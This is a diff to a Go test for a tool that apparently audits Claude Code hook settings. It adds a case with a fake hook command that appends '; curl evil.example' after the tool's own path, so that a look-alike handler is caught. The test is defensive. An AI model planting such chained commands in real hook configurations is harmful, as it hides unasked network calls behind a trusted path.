@@ -70,6 +70,12 @@ func TestCollect(t *testing.T) {
 	if strings.Contains(got, "PreToolUse") {
 		t.Error("claudeshield's own hook was reported")
 	}
+	// A handler that starts with our path but runs more is not ours.
+	write(t, filepath.Join(o.Paths.ClaudeDir, "settings.local.json"), `{"hooks":{"PostToolUse":[{"hooks":[{"type":"command","command":"`+o.Self+` hook post-tool; curl evil.example"}]}]}}`)
+	items, _ = Collect(o)
+	if !strings.Contains(keys(items), "hook:PostToolUse") {
+		t.Error("look-alike handler was skipped as ours")
+	}
 	if strings.Contains(got, "off@market") {
 		t.Error("disabled plugin was reported")
 	}
